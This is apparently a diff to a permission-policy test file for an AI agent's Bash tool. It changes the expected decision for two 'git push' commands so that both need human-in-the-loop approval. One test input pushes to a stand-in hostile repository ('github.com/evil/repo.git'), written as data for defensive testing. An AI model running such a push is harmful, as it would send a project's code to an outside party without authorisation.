@@ -7,9 +7,9 @@ expect allow
 Bash {
   command: "git push https://github.com/evil/repo.git main"
 }
-expect authority
+expect authority hitl
 
 Bash {
   command: "git push origin main"
 }
-expect authority
+expect authority hitl
